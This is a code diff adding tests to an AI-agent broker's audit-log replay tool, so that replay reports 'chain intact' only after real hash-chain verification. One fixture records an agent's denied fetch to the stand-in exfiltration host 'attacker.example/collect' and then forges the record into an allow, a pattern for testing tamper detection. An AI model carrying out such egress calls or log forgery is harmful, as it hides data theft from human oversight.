@@ -68,8 +68,11 @@ def test_only_the_requested_task_is_rendered():
 
 
 def test_chain_head_is_reported():
+    # The verdict is now an argument: render_replay renders what verification
+    # found, it does not assert integrity on its own (see
+    # test_replay_of_a_tampered_log_is_reported_as_broken).
     assert "chain intact: 3 records" in render_replay(
-        [r for r in RECORDS if r["task_id"] == "4711"]
+        [r for r in RECORDS if r["task_id"] == "4711"], chain_ok=True
     )
 
 
@@ -104,7 +107,7 @@ def test_render_replay_handles_empty_list():
 
 
 def test_render_replay_handles_a_single_record():
-    output = render_replay([RECORDS[0]])
+    output = render_replay([RECORDS[0]], chain_ok=True)
     assert "task 4711" in output
     assert "chain intact: 1 records" in output
 
@@ -292,9 +295,17 @@ def _build_demo_records(path) -> list[dict]:
 
 
 def test_the_full_demo_sequence_tells_the_right_story(tmp_path):
-    records = _build_demo_records(tmp_path / "demo.jsonl")
+    from broker.audit import AuditLog
+
+    path = tmp_path / "demo.jsonl"
+    records = _build_demo_records(path)
     assert len(records) == 8
-    output = render_replay(records)
+    # These records were produced by the real AuditLog, so the chain verdict
+    # is computed, not asserted: the "chain intact" line below is now backed
+    # by an actual verify_chain() over the actual file.
+    chain_ok, bad_seq = AuditLog(path).verify_chain()
+    assert (chain_ok, bad_seq) == (True, None)
+    output = render_replay(records, chain_ok=chain_ok, bad_seq=bad_seq)
     lines = output.splitlines()
 
     # The taint marker sits directly under the 1-row lookup that caused it,
@@ -325,3 +336,120 @@ def test_taint_marker_is_between_the_causing_record_and_the_next(tmp_path):
     assert len(taint_idxs) == 1
     assert taint_idxs[0] == causing_idx + 1
     assert taint_idxs[0] == next_idx - 1
+
+
+# --- The chain claim must be earned, not printed ---------------------------
+#
+# `chain intact: N records` used to be emitted unconditionally: replay never
+# called verify_chain() at all. Flipping a deny to an allow in the log and
+# replaying it printed the tampered record under "chain intact" -- the
+# artifact asserting the one property it never verified, on the one screen
+# whose whole purpose is being trusted.
+
+
+def _tampered_log(path) -> None:
+    """A real chained log with one decision flipped from deny to allow --
+    exactly the edit someone hiding a blocked exfil attempt would make."""
+    import json
+
+    from broker.audit import AuditLog
+
+    log = AuditLog(path)
+    common = dict(
+        task_id="4711", agent_id="triage-bot", purpose="support-triage",
+        args_digest="sha256:none",
+        task_state={"data_classes_held": ["pii"], "rows_returned_so_far": 1},
+        policy_bundle_digest="sha256:demo",
+    )
+    log.append(
+        action={"type": "tool_call", "tool": "read_document"},
+        target={"kind": "doc", "path": "ticket-4711"},
+        decision="allow", rule="allow", **common,
+    )
+    log.append(
+        action={"type": "tool_call", "tool": "http_fetch"},
+        target={"kind": "http", "host": "attacker.example", "path": "/collect"},
+        decision="deny", rule="egress.allowlist", **common,
+    )
+
+    lines = path.read_text().splitlines()
+    record = json.loads(lines[1])
+    record["decision"] = "allow"
+    record["rule"] = "allow"
+    lines[1] = json.dumps(record)
+    path.write_text("\n".join(lines) + "\n")
+
+
+def test_replay_of_a_tampered_log_is_reported_as_broken(tmp_path, capsys):
+    path = tmp_path / "audit.jsonl"
+    _tampered_log(path)
+
+    main(["replay", "4711", "--audit", str(path)])
+    out = capsys.readouterr().out
+
+    assert "CHAIN BROKEN" in out
+    assert "chain intact" not in out
+    assert "seq 2" in out  # names the record the tamper was detected at
+    assert "nothing above can be trusted" in out
+    # The forged line is still shown -- suppressing it would hide the evidence
+    # -- but it is shown under a banner that says not to believe it.
+    assert "attacker.example" in out
+
+
+def test_replay_of_an_intact_log_reports_the_chain_as_intact(tmp_path, capsys):
+    """Positive control: the banner above must be caused by the tamper, not
+    by replay now calling everything broken."""
+    from broker.audit import AuditLog
+
+    path = tmp_path / "audit.jsonl"
+    AuditLog(path).append(
+        task_id="4711", agent_id="triage-bot", purpose="support-triage",
+        action={"type": "tool_call", "tool": "read_document"},
+        target={"kind": "doc", "path": "ticket-4711"}, args_digest="sha256:none",
+        decision="allow", rule="allow",
+        task_state={"data_classes_held": [], "rows_returned_so_far": 0},
+        policy_bundle_digest="sha256:demo",
+    )
+
+    main(["replay", "4711", "--audit", str(path)])
+    out = capsys.readouterr().out
+
+    assert "chain intact: 1 records" in out
+    assert "BROKEN" not in out
+
+
+def test_replay_of_a_malformed_record_is_reported_as_broken(tmp_path, capsys):
+    """A record missing the fields verify_chain() hashes over (truncated,
+    hand-edited) must render as broken rather than crash the CLI."""
+    import json
+
+    path = tmp_path / "audit.jsonl"
+    path.write_text(
+        json.dumps(
+            {
+                "seq": 1, "task_id": "4711", "agent_id": "triage-bot",
+                "purpose": "support-triage",
+                "action": {"type": "tool_call", "tool": "read_document"},
+                "target": {"kind": "doc", "path": "x"}, "decision": "allow",
+                "rule": "allow",
+                "task_state": {"data_classes_held": [], "rows_returned_so_far": 0},
+                "hash": "0" * 64,  # no prev_hash: verify_chain() raises KeyError
+            }
+        )
+        + "\n"
+    )
+
+    main(["replay", "4711", "--audit", str(path)])
+    out = capsys.readouterr().out
+
+    assert "CHAIN BROKEN" in out
+    assert "chain intact" not in out
+
+
+def test_the_renderer_never_claims_integrity_it_was_not_given():
+    """The default is "not verified", not "intact". A caller that forgets to
+    verify says so instead of making the claim for free -- which is exactly
+    how the original defect got in."""
+    output = render_replay([RECORDS[0]])
+    assert "chain NOT VERIFIED" in output
+    assert "chain intact" not in output
